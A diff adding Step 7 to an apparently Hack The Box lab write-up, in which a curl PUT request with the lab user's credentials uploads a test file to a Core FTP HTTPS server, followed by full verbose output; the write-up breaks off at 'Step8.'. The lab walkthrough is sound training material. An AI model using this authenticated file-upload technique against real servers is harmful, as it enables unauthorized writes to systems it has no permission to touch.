@@ -369,4 +369,71 @@ I'm testing the FTP using HTTPS, everything looks good.
 ```
 
 Step7. We will now create a dummy file (payload) and then upload it to check the file working or not and it worked.
+```bash
+┌──(root㉿kali)-[~]
+└─# echo 'HTB-PUT-TEST' > /tmp/test.txt
 
+┌──(root㉿kali)-[~]
+└─# curl -vk --tlsv1.2 --tls-max 1.2 \
+-X PUT \
+-H "Host: localhost" \
+--basic -u 'fiona:987654321' \
+--data-binary @/tmp/test.txt \
+--path-as-is \
+https://10.129.111.81/docs.txt
+*   Trying 10.129.111.81:443...
+* ALPN: curl offers h2,http/1.1
+* TLSv1.2 (OUT), TLS handshake, Client hello (1):
+* SSL Trust: peer verification disabled
+* TLSv1.2 (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp384r1 / rsaEncryption
+* ALPN: server did not agree on a protocol. Uses default.
+* Server certificate:
+*   subject: C=US; ST=FL; L=test; OU=Test; O=Testing; emailAddress=fiona@inlanefreight.htb; CN=Test
+*   start date: Apr 21 19:27:17 2022 GMT
+*   expire date: Apr 18 19:27:17 2032 GMT
+*   issuer: C=US; ST=FL; L=test; OU=Test; O=Testing; emailAddress=fiona@inlanefreight.htb; CN=Test
+*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using shaWithRSAEncryption
+* OpenSSL verify result: 12
+*  SSL certificate verification failed, continuing anyway!
+* Established connection to 10.129.111.81 (10.129.111.81 port 443) from 10.10.17.239 port 52486 
+* using HTTP/1.x
+* Server auth using Basic with user 'fiona'
+> PUT /docs.txt HTTP/1.1
+> Host: localhost
+> Authorization: Basic ZmlvbmE6OTg3NjU0MzIx
+> User-Agent: curl/8.20.0
+> Accept: */*
+> Content-Length: 13
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 13 bytes
+< HTTP/1.1 200 Ok
+< Date:Sat, 15 Jul 2026 18:56:33 GMT
+< Server: Core FTP HTTP Server
+< Accept-Ranges: bytes
+< Connection: Keep-Alive
+< Content-type: text/text
+* no chunk, no close, no size. Assume close to signal end
+< 
+HTTP/1.1 200 Ok
+Date:Sat, 15 Jul 2026 18:56:33 GMT
+Server: Core FTP HTTP Server
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-type: text/text
+Content-length: 13
+
+* TLSv1.2 (IN), TLS alert, close notify (256):
+* shutting down connection #0
+
+```
+
+Step8. 
